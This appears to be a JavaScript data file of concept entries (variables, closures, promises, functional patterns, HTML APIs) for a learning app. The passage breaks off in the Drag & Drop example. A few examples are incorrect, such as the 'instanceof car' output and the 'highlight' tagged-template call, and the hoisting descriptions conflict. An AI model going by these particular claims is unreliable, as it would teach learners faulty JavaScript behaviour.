export const concepts = [
  // ═══════════════════════════════════════════
  // JAVASCRIPT — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Variables & Data Types',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Understanding var, let, const, and JavaScript\'s dynamic type system.',
    content: 'JavaScript has three ways to declare variables: var (function-scoped, hoisted), let (block-scoped, not hoisted), and const (block-scoped, immutable binding). JavaScript is dynamically typed — a variable can hold any type without declaration. The primitive types are: string, number, bigint, boolean, undefined, symbol, and null. typeof operator checks types at runtime. Always use const by default, let when reassignment is needed, and avoid var entirely.',
    example: `const name = "Alice";     // string
const age = 25;            // number
const big = 9007199254740991n; // bigint
const active = true;       // boolean
let score;                 // undefined
const empty = null;        // null

console.log(typeof name);  // "string"
console.log(typeof age);   // "number"
console.log(typeof empty); // "object" (historic bug)`
  },
  {
    title: 'Hoisting',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'JavaScript moves declarations to the top of their scope during compilation.',
    content: 'Hoisting allows you to use functions and variables before they are declared. However, only declarations are hoisted, not initializations. Variables declared with "var" are hoisted and initialized as "undefined", while "let" and "const" are hoisted but sit in a "temporal dead zone" (TDZ) — accessing them before declaration throws a ReferenceError. Function declarations are fully hoisted (name + body). Function expressions and arrow functions follow variable hoisting rules.',
    example: `console.log(x); // undefined (var is hoisted)
var x = 5;

foo(); // "Hello" (function declaration fully hoisted)
function foo() { console.log("Hello"); }

// bar(); // ReferenceError! (temporal dead zone)
// let bar = () => {};`
  },
  {
    title: 'Closures',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'A function bundled with its lexical environment — the foundation of data privacy.',
    content: 'A closure is created when a function retains access to variables from its outer scope, even after the outer function has returned. Every function in JavaScript creates a closure. Closures are used for data privacy (module pattern), function factories, event handlers, and maintaining state in async operations. The inner function "closes over" the outer variables, keeping them alive in memory.',
    example: `function createCounter() {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
}
const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
counter.getCount();  // 2
// count is private — not accessible outside`
  },
  {
    title: 'This Keyword',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Refers to the execution context — its value depends on HOW a function is called.',
    content: 'The "this" keyword behaves differently based on context: (1) Global: window in browsers, (2) Object method: the object, (3) Function: window (strict: undefined), (4) Arrow function: inherits "this" from enclosing scope, (5) Constructor: the new instance, (6) Explicit: call/apply/bind. Arrow functions do NOT have their own "this" — they capture it lexically. This is the most common source of bugs in JavaScript.',
    example: `const person = {
  name: "Alice",
  greet() { console.log("Hi, " + this.name); },   // "Alice"
  greetArrow: () => console.log(this)              // window!
};

person.greet(); // "Hi, Alice"

const detached = person.greet;
detached();     // "Hi, undefined" (this lost)

// Fix with bind:
const bound = person.greet.bind(person);
bound();        // "Hi, Alice"`
  },
  {
    title: 'Prototypes',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'The mechanism by which JavaScript objects inherit features from one another.',
    content: 'Every JavaScript object has a hidden [[Prototype]] link to another object. When you access a property, JS first looks on the object, then walks up the prototype chain until it finds it or reaches null. Object.create() sets the prototype explicitly. __proto__ is the accessor, Object.getPrototypeOf() is the standard way. Prototype-based inheritance is the foundation of JavaScript\'s object system, predating ES6 classes.',
    example: `const animal = { eats: true, walk() { return "walking"; } };
const rabbit = Object.create(animal);
rabbit.jumps = true;

console.log(rabbit.eats);   // true (inherited)
console.log(rabbit.jumps);  // true (own)
console.log(rabbit.walk()); // "walking"

console.log(Object.getPrototypeOf(rabbit) === animal); // true`
  },
  {
    title: 'Arrow Functions',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Concise function syntax with lexical "this" binding.',
    content: 'Arrow functions (=>) provide a shorter syntax and lexically bind "this" — they inherit "this" from the enclosing scope. They cannot be used as constructors, have no arguments object, and cannot be used as generator functions. Best for callbacks, array methods, and functional programming. Not suitable for object methods, prototype methods, or constructors.',
    example: `// Traditional
function add(a, b) { return a + b; }

// Arrow
const add = (a, b) => a + b;

// Single param — no parens needed
const double = x => x * 2;

// No params
const greet = () => "Hello!";

// Multi-line body
const process = (items) => {
  const result = items.map(i => i * 2);
  return result.filter(i => i > 4);
};`
  },
  {
    title: 'Destructuring',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Extract values from arrays and objects into distinct variables.',
    content: 'Destructuring makes code cleaner by extracting only needed properties. Array destructuring uses position, object destructuring uses key matching. Supports defaults, renaming, nested destructuring, and rest patterns. Works with function parameters too.',
    example: `// Object destructuring
const user = { id: 1, name: "Joe", age: 25, city: "NYC" };
const { name, age } = user;  // name="Joe", age=25
const { name: userName } = user; // rename to userName

// Array destructuring
const [first, , third] = [10, 20, 30]; // first=10, third=30

// Defaults
const { role = "student" } = {}; // role="student"

// Nested
const { address: { zip } } = { address: { zip: "10001" } };

// Function params
function greet({ name, age }) {
  return \`\${name} is \${age}\`;
}`
  },
  {
    title: 'Spread & Rest Operators',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: '... expands iterables (spread) or collects them (rest).',
    content: 'Spread (...) expands an iterable into individual elements. Used for copying arrays/objects, merging, and passing arguments. Rest (...) collects multiple elements into an array. Used in function parameters and destructuring. They look the same but work in opposite directions.',
    example: `// Spread — expanding
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5]; // [1,2,3,4,5]
const copy = [...arr1];        // shallow copy

const obj1 = { a: 1, b: 2 };
const obj2 = { ...obj1, c: 3 }; // {a:1, b:2, c:3}

// Rest — collecting
function sum(...nums) {
  return nums.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4); // 10

const [head, ...tail] = [1, 2, 3]; // head=1, tail=[2,3]`
  },
  {
    title: 'Template Literals',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Enhanced string syntax with interpolation and multi-line support.',
    content: 'Template literals use backticks (`) instead of quotes. They support expression interpolation with ${}, multi-line strings without concatenation, and tagged templates for advanced processing. They are the modern way to build strings in JavaScript.',
    example: `const name = "Alice";
const age = 25;

// Interpolation
const msg = \`Hello, \${name}! You are \${age}.\`;

// Multi-line
const html = \`
  <div class="card">
    <h2>\${name}</h2>
    <p>Age: \${age}</p>
  </div>
\`;

// Tagged template
function highlight(strings, ...values) {
  return strings.reduce((result, str, i) =>
    result + str + (values[i] ? \`**\${values[i]}**\` : ''), '');
}
highlight("Name:", name); // "Name:**Alice**"`
  },
  {
    title: 'Optional Chaining',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Safe property access that returns undefined instead of throwing.',
    content: 'Optional chaining (?.) short-circuits and returns undefined if the value before it is null or undefined. Works with property access (obj?.prop), method calls (obj?.method()), array access (arr?.[0]), and function calls (fn?.()). Prevents "Cannot read property of undefined" errors.',
    example: `const user = {
  profile: {
    address: {
      city: "NYC"
    }
  }
};

// Without optional chaining (risky)
const city1 = user && user.profile && user.profile.address && user.profile.address.city;

// With optional chaining
const city2 = user?.profile?.address?.city; // "NYC"
const zip = user?.profile?.address?.zip;     // undefined (no error)
const phone = user?.contact?.phone;          // undefined (no error)

// Method calls
user?.getProfile?.(); // undefined if method doesn't exist`
  },
  {
    title: 'Nullish Coalescing',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: '?? provides a default value only for null/undefined, not falsy values.',
    content: 'The nullish coalescing operator (??) returns the right-hand side only when the left is null or undefined. Unlike ||, it does NOT treat 0, "", or false as "empty". This makes it safer for providing defaults when 0 or "" are valid values.',
    example: `// || treats 0, "", false as falsy
const a = 0 || 10;    // 10 (wrong if 0 is valid)
const b = "" || "hi";  // "hi" (wrong if empty string is valid)

// ?? only triggers on null/undefined
const c = 0 ?? 10;     // 0 (correct!)
const d = "" ?? "hi";  // "" (correct!)
const e = null ?? 10;  // 10
const f = undefined ?? 10; // 10

// Great for config defaults
const config = {
  timeout: 0 ?? 5000,   // 0 (intentional)
  retries: null ?? 3,   // 3 (fallback)
};`
  },
  {
    title: 'Short Circuit Evaluation',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Using &&, ||, and ?? for conditional logic without if-statements.',
    content: 'Logical operators in JavaScript return the actual value of the evaluated operand, not just true/false. || returns the first truthy value. && returns the first falsy value (or last if all truthy). This enables compact conditional expressions.',
    example: `// || — default values
const name = user.name || "Anonymous";

// && — conditional rendering (React pattern)
const greeting = isLoggedIn && <h1>Welcome!</h1>;

// || — short circuit
false || "fallback";  // "fallback"
"hello" || "world";   // "hello"

// && — early return
isValid && save();

// Combining
const display = user?.name || "Guest";`
  },
  {
    title: 'Loops & Iteration',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'for, for...of, for...in, while, forEach, and iteration protocols.',
    content: 'JavaScript provides multiple loop constructs: for (index-based), for...of (iterables like arrays, strings), for...in (object keys), while (condition-based), do...while (runs at least once). Array methods like forEach, map, filter, reduce are functional alternatives. for...of uses the iteration protocol — works with any object implementing Symbol.iterator.',
    example: `const arr = [10, 20, 30];
const obj = { a: 1, b: 2, c: 3 };

// for
for (let i = 0; i < arr.length; i++) console.log(arr[i]);

// for...of (values)
for (const val of arr) console.log(val);

// for...in (keys)
for (const key in obj) console.log(key, obj[key]);

// while
let i = 0;
while (i < arr.length) { console.log(arr[i]); i++; }

// Functional
arr.forEach((val, i) => console.log(i, val));
const doubled = arr.map(x => x * 2);
const evens = arr.filter(x => x % 2 === 0);`
  },
  {
    title: 'Error Handling',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'try/catch/finally, custom errors, and defensive programming.',
    content: 'JavaScript uses try/catch/finally for runtime error handling. Errors are objects (Error, TypeError, ReferenceError, etc.). throw creates custom errors. finally always runs, even after return. Async code uses .catch() or try/catch with await. Always handle errors gracefully — never let them crash your app silently.',
    example: `// Basic try/catch
try {
  const data = JSON.parse(invalidJSON);
} catch (error) {
  console.error("Parse failed:", error.message);
} finally {
  console.log("Always runs");
}

// Custom errors
class ValidationError extends Error {
  constructor(field, message) {
    super(message);
    this.field = field;
    this.name = "ValidationError";
  }
}

function validateAge(age) {
  if (age < 0) throw new ValidationError("age", "Must be positive");
}

// Async error handling
async function fetchData() {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
    return await res.json();
  } catch (err) {
    console.error("Fetch failed:", err);
  }
}`
  },
  {
    title: 'Modules (ES6)',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Import/export system for organizing code into reusable modules.',
    content: 'ES6 modules use import/export to share code between files. export default exports one main thing per file. Named exports (export { }) allow multiple exports. Import { } destructures named exports. Import * as ns gets everything as a namespace. Modules are always in strict mode and have their own scope. Dynamic import() loads modules on demand.',
    example: `// math.js — named exports
export const PI = 3.14159;
export function add(a, b) { return a + b; }
export default class Calculator { ... }

// app.js — importing
import Calculator, { PI, add } from './math.js';
import * as MathUtils from './math.js';

// Dynamic import (code splitting)
async function loadHeavyModule() {
  const { analyze } = await import('./analyzer.js');
  analyze(data);
}

// Re-export
export { add, PI } from './math.js';`
  },

  // ═══════════════════════════════════════════
  // JAVASCRIPT — Advanced
  // ═══════════════════════════════════════════
  {
    title: 'Event Loop',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'The mechanism that enables non-blocking I/O in single-threaded JavaScript.',
    content: 'The Event Loop constantly monitors the Call Stack and Task Queues. When the stack is empty, it checks the Microtask Queue (Promises, queueMicrotask) first — all microtasks run before the next macrotask. Then it takes the next macrotask (setTimeout, setInterval, I/O). Rendering happens between tasks. Understanding this explains why Promises execute before setTimeout(fn, 0).',
    example: `console.log("1");              // Call Stack

setTimeout(() => console.log("2"), 0);  // Macrotask

Promise.resolve().then(() => console.log("3")); // Microtask

console.log("4");              // Call Stack

// Output: 1, 4, 3, 2
// Explanation:
// 1. "1" and "4" are synchronous (Call Stack)
// 2. "3" is a microtask (runs before next macrotask)
// 3. "2" is a macrotask (runs last)`
  },
  {
    title: 'Promises',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'An object representing the eventual completion or failure of an async operation.',
    content: 'A Promise is in one of three states: pending (initial), fulfilled (resolved), or rejected (failed). Promise chains with .then()/.catch()/.finally() handle async flow. Promise.all() resolves all, Promise.race() resolves first, Promise.allSettled() waits for all, Promise.any() resolves first success. Always return from .then() to chain properly.',
    example: `// Creating a promise
const fetchUser = (id) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) resolve({ id, name: "Alice" });
    else reject(new Error("Invalid ID"));
  }, 1000);
});

// Chaining
fetchUser(1)
  .then(user => fetchPosts(user.id))
  .then(posts => console.log(posts))
  .catch(err => console.error(err))
  .finally(() => console.log("done"));

// Combining
const [user, posts] = await Promise.all([
  fetchUser(1),
  fetchPosts(1)
]);`
  },
  {
    title: 'Async/Await',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Syntactic sugar for working with Promises in a synchronous-looking way.',
    content: 'The async keyword makes a function return a Promise. await pauses execution until a Promise settles and returns its result. Use try/catch for error handling. Async/await makes asynchronous code read like synchronous code. You can use Promise.all() with destructuring for parallel operations. Top-level await is supported in ES modules.',
    example: `async function loadDashboard(userId) {
  try {
    const user = await fetchUser(userId);
    const [posts, notifications] = await Promise.all([
      fetchPosts(user.id),
      fetchNotifications(user.id)
    ]);
    return { user, posts, notifications };
  } catch (error) {
    console.error("Failed to load:", error);
    throw error;
  }
}

// Top-level await (in modules)
const response = await fetch('/api/data');
const data = await response.json();`
  },
  {
    title: 'Prototypal Inheritance',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Objects inherit directly from other objects via the prototype chain.',
    content: 'Unlike class-based inheritance, prototypal inheritance allows objects to be created from other objects. Object.create() creates a new object with a specified prototype. The __proto__ chain is traversed when accessing properties. ES6 classes are syntactic sugar over prototypal inheritance. instanceof checks the prototype chain.',
    example: `const vehicle = {
  start() { return "Engine started"; },
  stop() { return "Engine stopped"; }
};

const car = Object.create(vehicle);
car.drive = function() { return "Driving..."; };

const tesla = Object.create(car);
tesla.autopilot = function() { return "Auto-driving..."; };

console.log(tesla.start());      // "Engine started" (inherited)
console.log(tesla.drive());      // "Driving..." (inherited)
console.log(tesla.autopilot());  // "Auto-driving..." (own)

console.log(tesla instanceof car); // false (not class-based)`
  },
  {
    title: 'Proxy & Reflect',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Intercept and customize fundamental operations on objects.',
    content: 'A Proxy wraps an object and intercepts operations via traps (get, set, has, deleteProperty, etc.). Reflect provides default behavior for these traps. Used for validation, logging, reactive data binding, default values, and access control. Vue 3\'s reactivity system is built on Proxies.',
    example: `const handler = {
  get(target, prop, receiver) {
    console.log(\`Accessing: \${prop}\`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    if (prop === 'age' && typeof value !== 'number') {
      throw new TypeError('Age must be a number');
    }
    console.log(\`Setting: \${prop} = \${value}\`);
    return Reflect.set(target, prop, value, receiver);
  }
};

const person = new Proxy({ name: "Alice", age: 25 }, handler);
person.age = 30;       // logs "Setting: age = 30"
// person.age = "old"; // TypeError: Age must be a number`
  },
  {
    title: 'WeakMap & WeakRef',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Memory-efficient collections that allow garbage collection of keys.',
    content: 'WeakMap keys must be objects and are weakly held (no strong reference preventing GC). Useful for private data, caching, and storing metadata without preventing garbage collection. WeakRef provides a weaker reference to an object. FinalizationRegistry runs cleanup when objects are collected. Both prevent memory leaks in long-running applications.',
    example: `// WeakMap for private data
const privateData = new WeakMap();

class User {
  constructor(name, password) {
    privateData.set(this, { password });
    this.name = name;
  }
  checkPassword(pw) {
    return privateData.get(this).password === pw;
  }
}

// WeakMap for caching
const cache = new WeakMap();
function process(obj) {
  if (cache.has(obj)) return cache.get(obj);
  const result = heavyComputation(obj);
  cache.set(obj, result);
  return result;
}

// When obj is no longer referenced, cache entry is GC'd`
  },
  {
    title: 'Generators & Iterators',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Custom iteration protocols and lazy sequence generation.',
    content: 'A generator is a function that can be paused and resumed (function*). It yields values lazily using yield. The iterator protocol requires { next() } returning { value, done }. Generators are useful for lazy evaluation, infinite sequences, async iteration, and state machines. They power for...of loops internally.',
    example: `// Generator function
function* fibonacci() {
  let [a, b] = [0, 1];
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
console.log(fib.next().value); // 0
console.log(fib.next().value); // 1
console.log(fib.next().value); // 1
console.log(fib.next().value); // 2

// Custom iterator
const range = {
  from: 1, to: 5,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { done: true };
      }
    };
  }
};
console.log([...range]); // [1,2,3,4,5]`
  },
  {
    title: 'Symbols',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Unique, immutable identifiers for object property keys.',
    content: 'Symbol is a primitive type that creates unique identifiers. Every Symbol() call returns a new unique value, even with the same description. Used as object property keys to avoid name collisions. Well-known symbols (Symbol.iterator, Symbol.toPrimitive) customize object behavior. Enables "private" properties and meta-programming.',
    example: `const id = Symbol('id');
const user = { [id]: 123, name: "Alice" };
console.log(user[id]); // 123
console.log(Object.keys(user)); // ["name"] (symbol hidden)

// Symbol.for — global registry
const s1 = Symbol.for('shared');
const s2 = Symbol.for('shared');
console.log(s1 === s2); // true

// Well-known symbols
class Money {
  constructor(amount) { this.amount = amount; }
  [Symbol.toPrimitive](hint) {
    return hint === 'string' ? \`$\${this.amount}\` : this.amount;
  }
}
console.log(\`Price: \${new Money(50)}\`); // "Price: $50"`
  },

  // ═══════════════════════════════════════════
  // JAVASCRIPT — Functional
  // ═══════════════════════════════════════════
  {
    title: 'Higher-Order Functions',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Functions that take or return other functions — the core of functional programming.',
    content: 'A higher-order function either accepts a function as an argument or returns a function. Array methods (map, filter, reduce, sort) are higher-order functions. They enable composition, abstraction, and declarative code. createCounter, debounce, throttle are all higher-order functions.',
    example: `// Function that returns a function
function multiplier(factor) {
  return (number) => number * factor;
}
const double = multiplier(2);
const triple = multiplier(3);
console.log(double(5)); // 10

// Array higher-order methods
const numbers = [1, 2, 3, 4, 5];
const result = numbers
  .filter(n => n % 2 === 0)   // [2, 4]
  .map(n => n * 10);           // [20, 40]

// Composing functions
const compose = (f, g) => (x) => f(g(x));
const add1 = x => x + 1;
const square = x => x * x;
const add1ThenSquare = compose(square, add1);
console.log(add1ThenSquare(3)); // (3+1)^2 = 16`
  },
  {
    title: 'Currying',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Transforming a multi-argument function into a chain of single-argument functions.',
    content: 'Currying converts f(a,b,c) into f(a)(b)(c). Useful for creating specialized functions from generic ones, partial application, and functional composition. In practice, partial application (fixing some arguments) is more common than full currying.',
    example: `// Manual currying
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return (...args2) => curried(...args, ...args2);
  };
}

const add = curry((a, b, c) => a + b + c);
console.log(add(1)(2)(3));   // 6
console.log(add(1, 2)(3));   // 6
console.log(add(1)(2, 3));   // 6

// Practical: log with context
const log = curry((level, msg) => \`[\${level}] \${msg}\`);
const error = log("ERROR");
error("Something broke"); // "[ERROR] Something broke"`
  },
  {
    title: 'Debounce & Throttle',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Rate-limiting techniques for performance-critical event handlers.',
    content: 'Debounce delays execution until a pause in calls — ideal for search inputs and resize handlers. Throttle limits execution to once per interval — ideal for scroll and mousemove handlers. Both prevent performance bottlenecks from rapid-fire events.',
    example: `// Debounce — wait for pause
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const search = debounce((query) => {
  fetchResults(query);
}, 300);

input.addEventListener('input', (e) => search(e.target.value));

// Throttle — fire at most once per interval
function throttle(fn, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

window.addEventListener('scroll', throttle(updatePosition, 100));`
  },
  {
    title: 'Memoization',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Caching function results for previously computed inputs.',
    content: 'Memoization stores the return value of a function based on its arguments. Ideal for expensive pure functions like recursive calculations. The cache acts as a lookup table — if the input was seen before, return the cached result instead of recomputing.',
    example: `function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

// Expensive recursive Fibonacci
const fib = memoize(function(n) {
  if (n <= 1) return n;
  return fib(n - 1) + fib(n - 2);
});

console.log(fib(40)); // Instant (with memoization)
// Without memoize: would take seconds`
  },
  {
    title: 'Pure Functions & Immutability',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Functions with no side effects and deterministic output — the backbone of reliable code.',
    content: 'A pure function always returns the same output for the same input and has no side effects (no DOM manipulation, no global state changes, no I/O). Immutability means never changing data — instead, create new copies with modifications. These principles make code predictable, testable, and easy to debug.',
    example: `// Impure (mutates input)
function addScore(scores, score) {
  scores.push(score);  // side effect!
  return scores;
}

// Pure (returns new array)
function addScore(scores, score) {
  return [...scores, score];
}

// Immutable updates
const user = { name: "Alice", age: 25 };
const updated = { ...user, age: 26 }; // new object

// Array immutability
const items = [1, 2, 3];
const removed = items.filter(i => i !== 2); // [1, 3]
const added = [...items, 4];                // [1, 2, 3, 4]`
  },

  // ═══════════════════════════════════════════
  // HTML
  // ═══════════════════════════════════════════
  {
    title: 'Semantic HTML',
    category: 'HTML',
    subcategory: 'Structure',
    description: 'Using meaningful elements that describe content purpose, not appearance.',
    content: 'Semantic HTML uses elements that convey meaning: header, nav, main, article, section, aside, footer, figure, figcaption, time, mark, details/summary. These improve accessibility (screen readers), SEO (search engines understand structure), and code maintainability. Avoid div-soup — prefer semantic elements whenever possible.',
    example: `<!-- Non-semantic (div soup) -->
<div class="header">
  <div class="nav">...</div>
</div>
<div class="content">...</div>

<!-- Semantic -->
<header>
  <nav aria-label="Main navigation">...</nav>
</header>
<main>
  <article>
    <h1>Title</h1>
    <section aria-labelledby="section1">
      <h2 id="section1">Section</h2>
    </section>
    <aside>Related info</aside>
  </article>
</main>
<footer>
  <time datetime="2025-01-15">Jan 15</time>
</footer>`
  },
  {
    title: 'Forms & Validation',
    category: 'HTML',
    subcategory: 'Forms',
    description: 'Building accessible, validated forms with HTML5 input types and attributes.',
    content: 'HTML5 provides built-in form validation: required, pattern, min/max, minlength/maxlength, type (email, url, tel, number, date). The constraint validation API (checkValidity, reportValidity) and :invalid/:valid pseudo-classes enable custom styling. Always pair HTML validation with server-side validation.',
    example: `<form novalidate>
  <input type="email" required placeholder="Email"
    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}$" />

  <input type="password" minlength="8"
    pattern="(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
    title="Must contain uppercase, lowercase, and number" />

  <input type="url" required placeholder="Website" />
  <input type="number" min="0" max="100" step="5" />

  <input type="text" required aria-describedby="name-help" />
  <small id="name-help">Your full name</small>

  <button type="submit">Submit</button>
</form>

<script>
document.querySelector('form').addEventListener('submit', (e) => {
  if (!e.target.checkValidity()) {
    e.preventDefault();
    // Show custom error messages
  }
});
</script>`
  },
  {
    title: 'Accessibility (a11y)',
    category: 'HTML',
    subcategory: 'Best Practices',
    description: 'Making web content usable for everyone, including people with disabilities.',
    content: 'Accessibility ensures your site works for screen readers, keyboard navigation, and assistive technologies. Key principles: use semantic HTML, provide alt text for images, ensure keyboard navigation, use ARIA attributes when needed, maintain proper heading hierarchy, ensure sufficient color contrast, and test with actual assistive technology.',
    example: `<!-- Alt text for images -->
<img src="chart.png" alt="Sales increased 40% in Q4" />

<!-- Keyboard accessible -->
<button onclick="submit()" tabindex="0">Submit</button>

<!-- ARIA labels for complex widgets -->
<nav aria-label="Main navigation">
  <ul role="menubar">
    <li role="menuitem"><a href="/">Home</a></li>
  </ul>
</nav>

<!-- Form accessibility -->
<label for="email">Email</label>
<input id="email" type="email" aria-required="true"
  aria-invalid="false" aria-describedby="email-error" />
<span id="email-error" role="alert"></span>

<!-- Skip navigation -->
<a href="#main-content" class="skip-link">Skip to content</a>`
  },
  {
    title: 'HTML5 APIs',
    category: 'HTML',
    subcategory: 'APIs',
    description: 'Built-in browser APIs: Canvas, Geolocation, Storage, Workers, and more.',
    content: 'HTML5 introduced powerful APIs: Canvas (2D/3D drawing), Geolocation (user location), Web Storage (localStorage/sessionStorage), Web Workers (background threads), Service Workers (offline support), Drag and Drop, History API (SPA routing), Intersection Observer (lazy loading), and Web Animations API.',
    example: `// Canvas drawing
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
ctx.fillStyle = '#3b82f6';
ctx.fillRect(10, 10, 100, 100);

// Geolocation
navigator.geolocation.getCurrentPosition(
  (pos) => console.log(pos.coords.latitude, pos.coords.longitude),
  (err) => console.error(err)
);

// Local Storage
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// Web Worker
const worker = new Worker('worker.js');
worker.postMessage({ data: largeArray });
worker.onmessage = (e) => console.log(e.data);`
  },
  {
    title: 'Meta Tags & SEO',
    category: 'HTML',
    subcategory: 'Best Practices',
    description: 'Optimizing HTML for search engines and social media sharing.',
    content: 'Meta tags provide information about the page to browsers and search engines. Essential tags: charset, viewport, description, keywords, robots, Open Graph (Facebook), Twitter Cards, and canonical URLs. Structured data (JSON-LD) helps search engines understand your content.',
    example: `<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="SmartQuiz - Master JavaScript with interactive quizzes" />
  <meta name="robots" content="index, follow" />
  <link rel="canonical" href="https://smartquiz.com/page" />

  <!-- Open Graph -->
  <meta property="og:title" content="SmartQuiz" />
  <meta property="og:description" content="Master JavaScript" />
  <meta property="og:image" content="https://smartquiz.com/og.png" />
  <meta property="og:type" content="website" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />

  <!-- Structured Data -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebApplication",
    "name": "SmartQuiz"
  }
  </script>
</head>`
  },
  {
    title: 'Audio & Video',
    category: 'HTML',
    subcategory: 'Media',
    description: 'Embedding and controlling multimedia content with native HTML elements.',
    content: 'The audio and video elements provide native media playback without plugins. Support multiple formats for browser compatibility (MP4/WebM for video, MP3/OGG for audio). Use the media API for programmatic control (play, pause, volume, currentTime). Always provide captions and transcripts for accessibility.',
    example: `<!-- Video -->
<video controls width="640" poster="thumb.jpg">
  <source src="lesson.mp4" type="video/mp4" />
  <source src="lesson.webm" type="video/webm" />
  <track kind="captions" src="captions.vtt" srclang="en" label="English" />
  Your browser does not support video.
</video>

<!-- Audio -->
<audio controls>
  <source src="podcast.mp3" type="audio/mpeg" />
  <source src="podcast.ogg" type="audio/ogg" />
</audio>

<!-- Programmatic control -->
<script>
  const video = document.querySelector('video');
  video.playbackRate = 1.5;
  video.currentTime = 30;
</script>`
  },
  {
    title: 'Canvas & SVG',
    category: 'HTML',
    subcategory: 'Graphics',
    description: 'Drawing graphics: Canvas for pixel-level control, SVG for scalable shapes.',
    content: 'Canvas provides a bitmap drawing surface — great for pixel manipulation, games, and animations. SVG creates resolution-independent vector graphics — ideal for icons, charts, and UI elements. Canvas is imperative (draw commands), SVG is declarative (DOM elements).',
    example: `<!-- Canvas -->
<canvas id="game" width="800" height="600"></canvas>
<script>
  const ctx = document.getElementById('game').getContext('2d');
  ctx.fillStyle = '#3b82f6';
  ctx.beginPath();
  ctx.arc(400, 300, 50, 0, Math.PI * 2);
  ctx.fill();
</script>

<!-- SVG -->
<svg viewBox="0 0 100 100" width="200" height="200">
  <circle cx="50" cy="50" r="40" fill="#3b82f6" />
  <text x="50" y="55" text-anchor="middle" fill="white">JS</text>
</svg>`
  },
  {
    title: 'Web Components',
    category: 'HTML',
    subcategory: 'Advanced',
    description: 'Custom, reusable HTML elements with encapsulated markup, styles, and behavior.',
    content: 'Web Components consist of Custom Elements (define new tags), Shadow DOM (encapsulated styling), HTML Templates (reusable markup slots), and ES Modules. They work in any framework or vanilla JS. Shadow DOM prevents style leaking and DOM conflicts.',
    example: `class MyCard extends HTMLElement {
  constructor() {
    super();
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = \`
      <style>
        .card { padding: 20px; border-radius: 12px; background: #1a1a2e; }
        ::slotted(h2) { color: white; margin: 0; }
      </style>
      <div class="card">
        <slot name="title"></slot>
        <slot name="content"></slot>
      </div>
    \`;
  }
}
customElements.define('my-card', MyCard);

// Usage
// <my-card>
//   <h2 slot="title">Hello</h2>
//   <p slot="content">World</p>
// </my-card>`
  },
  {
    title: 'Drag & Drop API',
    category: 'HTML',
    subcategory: 'Interaction',
    description: 'Native browser support for dragging elements between locations.',
    content: 'HTML5 Drag & Drop provides draggable attribute and events: dragstart, drag, dragenter, dragover, dragleave, drop, dragend. Use DataTransfer API to pass data between drag source and drop target. Works with files too (file drag from desktop).',
    example: `<!-- Draggable element -->
<div draggable="true" ondragstart="handleDrag(event)">
  Drag me
</div>

<!-- Drop zone -->
<div class="dropzone"
  ondragover="event.preventDefault()"
  ondrop="handleDrop(event)">
  Drop here
</div>

<script>
function handleDrag(e) {
  e.dataTransfer.setData('text/plain', 'Hello');
  e.dataTransfer.effectAllowed = 'move';
}

function handleDrop(e) {
